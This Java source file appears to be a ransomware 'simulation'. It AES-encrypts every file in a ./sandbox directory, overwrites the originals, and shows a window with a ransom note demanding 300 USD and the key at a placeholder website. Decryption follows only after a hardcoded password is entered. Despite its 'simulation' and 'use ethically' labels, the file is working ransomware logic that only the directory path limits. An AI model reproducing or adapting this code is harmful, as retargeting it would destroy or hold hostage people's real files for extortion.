import java.io.File;
import java.io.IOException;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.nio.file.StandardOpenOption;
import java.util.Scanner;
import java.util.Set;
import java.util.stream.Collectors;
import java.util.stream.Stream;
import javax.crypto.SecretKey;
import javax.swing.JFrame;
import javax.swing.JLabel;
import javax.swing.SwingConstants;
import java.awt.BorderLayout;
import java.awt.Color;

public class Main {
	public static void main(String[] args) {
		try {
			Scanner scanner = new Scanner(System.in);
      Window window = new Window();
      window.print("[*] Program running, This is a simulation");
      window.print("IT LOOKS LIKE YOUR FILES ARE ENCRYPTED\n");
			System.out.println("[*] Program running, Use ethically");
			safteyChecks();


			SecretKey secretKey = AESCore.generateKey();
			String encodedKey = AESCore.toBase64(secretKey);
			//System.out.println("[+] Secret Key (Base64): " + encodedKey);

      window.print("Please send Your identifier key: \n" + encodedKey + "\nTo www.fakewebsitethisisjustasimulation.com/dont-send-realmoney/\n and send 300USD to unlock your files...");

			Set<String> filesToEncrypt = listFiles();
			System.out.println(filesToEncrypt);

			for (String file : filesToEncrypt) {
				Path path = Paths.get("./sandbox", file);
				try {
					String fileContent = Files.readString(path);
					String encryptedFile = AESCore.encrypt(fileContent, secretKey);
					Files.writeString(path, encryptedFile, StandardOpenOption.TRUNCATE_EXISTING,
							StandardOpenOption.WRITE);
					System.out.println("FILE: " + path + "\n CONTENT: " + encryptedFile);
				} catch (Exception e) {
					System.err.println("[!] Encrypt error on " + file + ": ");
					e.printStackTrace();
				}
			}

      window.print("Enter Secret Key:");

			System.out.println("[*] Decrypting, Enter Secret Key: ");
			//String userEncodedKey = scanner.nextLine().trim();

      window.onInput(event -> {
        String userEncodedKey = window.getInput().trim();

			if (userEncodedKey.equals("qwe123")) {
				System.out.println("[+] Correct password decrypting...");

				for (String file : filesToEncrypt) {
					Path path = Paths.get("./sandbox", file);
					try {
						String enc = Files.readString(path);
						String dec = AESCore.decrypt(enc, secretKey);
						Files.writeString(path, dec, StandardOpenOption.TRUNCATE_EXISTING);
						System.out.println("[Decrypted: " + path + "]");
					} catch (Exception e) {
						System.err.println("[!] Failed: " + file);
					}
				}
				System.out.println("All done.");
				System.exit(0);
			} else {
				System.out.println("Incorrect password. Files stay encrypted.");
				System.exit(1);
			}
    });

			scanner.close();
		} catch (Exception e) {
			e.printStackTrace();
		}
	}

	public static Set<String> listFiles() {
		File[] files = new File("./sandbox").listFiles();
		if (files == null)
			return java.util.Collections.emptySet();
		return Stream.of(files).filter(f -> f != null && f.isFile()).map(File::getName).collect(Collectors.toSet());
	}

	public static void safteyChecks() throws Exception {
		Path PATH = Paths.get("./sandbox/");
		boolean exists = Files.exists(PATH);
		boolean isDirectory = Files.isDirectory(PATH);
		if (!exists || !isDirectory) {
			Files.createDirectory(PATH);
			System.out.println(
					"[!] SANDBOX WAS NOT A DIR, SANDBOX IS REQUIRED TO RUN THE PROGRAM\n Made ./sandbox/ a dir. Exiting now");
			System.exit(1);
		} else {
			System.out.println("Saftey Check Executed...");
		}
	}
}
